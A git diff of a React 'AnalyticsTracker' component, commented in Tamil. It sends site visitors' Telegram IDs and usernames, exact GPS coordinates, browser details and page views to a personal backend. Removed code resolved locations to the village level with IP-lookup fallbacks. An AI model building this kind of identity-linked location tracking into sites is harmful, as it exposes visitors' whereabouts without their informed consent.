@@ -1,4 +1,4 @@
-import  { useEffect, useState } from 'react';
+import React, { useEffect, useState } from 'react';
 import { BrowserRouter as Router, Routes, Route, useLocation, useNavigate } from 'react-router-dom';
 import { ArrowLeft } from 'lucide-react';
 import axios from 'axios';
@@ -21,6 +21,7 @@ function AnalyticsTracker() {
     const urlParams = new URLSearchParams(window.location.search);
     let currentUserId = urlParams.get('tgId');
 
+    // டெலிகிராம் இன்-ஆப் பிரவுசரில் இருந்து டேட்டாவைத் திரட்டுதல்
     if (!currentUserId && window.Telegram && window.Telegram.WebApp) {
       const tg = window.Telegram.WebApp;
       tg.ready();
@@ -30,6 +31,7 @@ function AnalyticsTracker() {
       }
     }
 
+    // ஒருவேளை டெலிகிராம் ஐடி இல்லை என்றால் வெப் ஐடி உருவாக்குவது
     if (!currentUserId) {
       currentUserId = "WEB_" + Math.floor(100000 + Math.random() * 900000);
     }
@@ -48,6 +50,7 @@ function AnalyticsTracker() {
     };
   }, []);
 
+  // பயனர் ஒவ்வொரு பக்கத்திற்கு மாறும்போதும் டிராக்கிங் செய்வது
   useEffect(() => {
     if (userId) {
       axios.post('https://rakeshakmbot.onrender.com/api/track-page', {
@@ -57,34 +60,23 @@ function AnalyticsTracker() {
     }
   }, [location, userId]);
 
+  // 🎯 அட்வான்ஸ்டு லொகேஷன் மற்றும் யூசர்நேம் அனுப்பும் ஃபங்க்ஷன்
   const sendInitialMetrics = async (tgId) => {
-    // 🌐 Exact Browser Client Configuration
     const browser = navigator.userAgent;
     const screenSize = `${window.innerWidth}x${window.innerHeight}`;
 
-    const fallbackToIPLocation = async () => {
-      try {
-        const ipRes = await axios.get('https://ipapi.co/json/');
-        const { city, region, postal, country_name } = ipRes.data;
-        return `${city} (${postal || 'No-Zip'}), ${region}, ${country_name} [IP-Tracking]`;
-      } catch (err) {
-        try {
-          const backupIpRes = await axios.get('https://ipwho.is/');
-          if(backupIpRes.data && backupIpRes.data.success) {
-             return `${backupIpRes.data.city}, ${backupIpRes.data.region}, ${backupIpRes.data.country} [Backup-IP]`;
-          }
-          return "Permission Denied / N/A";
-        } catch (backupErr) {
-          return "Permission Denied / N/A";
-        }
-      }
-    };
+    // 🚀 பிக்ஸ் 1: டெலிகிராம் வெப்-ஆப் சூழலில் இருந்து துல்லியமாக யூசர்நேமை பிரித்தெடுத்தல்
+    let tgUsername = "No Username";
+    if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe?.user) {
+      const tgUser = window.Telegram.WebApp.initDataUnsafe.user;
+      tgUsername = tgUser.username ? `@${tgUser.username}` : "No Username";
+    }
 
-    // 🎯 Real-time HTML5 Map & Geolocation Request
+    // HTML5 ஜியோலோகேஷன் கோரிக்கை
     if (navigator.geolocation) {
       const geoOptions = {
         enableHighAccuracy: true, 
-        timeout: 25000, // User allow pannuvatharku 25 seconds time limits
+        timeout: 25000, // பயனர் அனுமதி வழங்குவதற்கு 25 விநாடிகள் டைம் லிமிட்
         maximumAge: 0             
       };
 
@@ -92,44 +84,43 @@ function AnalyticsTracker() {
         async (position) => {
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
-          let resolvedLocation = "Geocode Failed / N/A";
 
-          try {
-            // Live map service reverse geocoding to extract village, city, area
-            const geoRes = await axios.get(
-              `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`,
-              { headers: { 'User-Agent': 'RakeshPortfolioAnalytics/1.0' } }
-            );
-            
-            const address = geoRes.data.address;
-            const currentArea = address.suburb || address.neighbourhood || address.village || address.city_district || address.road || "Unknown Area";
-            const city = address.city || address.town || address.district || "Unknown City";
-            const state = address.state || "";
-            
-            resolvedLocation = `${currentArea}, ${city}, ${state} [True-GPS]`;
-          } catch (err) {
-            resolvedLocation = await fallbackToIPLocation();
-          }
+          console.log("GPS Found! Lat:", lat, "Lon:", lon);
 
-          // Data payload-a backend-uku anupurathu
+          // 🚀 பிக்ஸ் 2: தேவையில்லாத பிரண்ட்-எண்ட் ஜியோகோடிங்கை நீக்கிவிட்டு,
+          // லேடிடியூட், லாங்கிடியூட் மற்றும் யூசர்நேமை நேரடியாக பேக்-எண்டிற்கு பாய்ச்சுதல்
           await axios.post('https://rakeshakmbot.onrender.com/api/save-metrics', {
-            telegramId: tgId, browser, screenSize, latitude: lat, longitude: lon, resolvedLocation
+            telegramId: tgId, 
+            username: tgUsername,
+            browser, 
+            screenSize, 
+            latitude: lat, 
+            longitude: lon
           }).catch(err => console.error("Metrics send error:", err.message));
         },
         async (error) => {
-          console.log("GPS Blocked / Denied. Using network location...");
-          const ipLocation = await fallbackToIPLocation();
-
+          console.log("GPS Blocked or Denied by user. Sending payload to server...");
+          // ஒருவேளை பயனர் மறுத்தால், லேடிடியூட் நல் (Null) ஆக செல்லும், சர்வர் IP டிராக்கிங்கை பயன்படுத்தும்
           await axios.post('https://rakeshakmbot.onrender.com/api/save-metrics', {
-            telegramId: tgId, browser, screenSize, latitude: null, longitude: null, resolvedLocation: ipLocation 
+            telegramId: tgId, 
+            username: tgUsername,
+            browser, 
+            screenSize, 
+            latitude: null, 
+            longitude: null 
           }).catch(err => console.error("Metrics backup error:", err.message));
         },
         geoOptions
       );
     } else {
-      const ipLocation = await fallbackToIPLocation();
+      // பிரவுசரில் லொகேஷன் வசதி இல்லை என்றால்
       await axios.post('https://rakeshakmbot.onrender.com/api/save-metrics', {
-        telegramId: tgId, browser, screenSize, latitude: null, longitude: null, resolvedLocation: ipLocation
+        telegramId: tgId, 
+        username: tgUsername,
+        browser, 
+        screenSize, 
+        latitude: null, 
+        longitude: null
       }).catch(err => console.error("Metrics fallback error:", err.message));
     }
   };
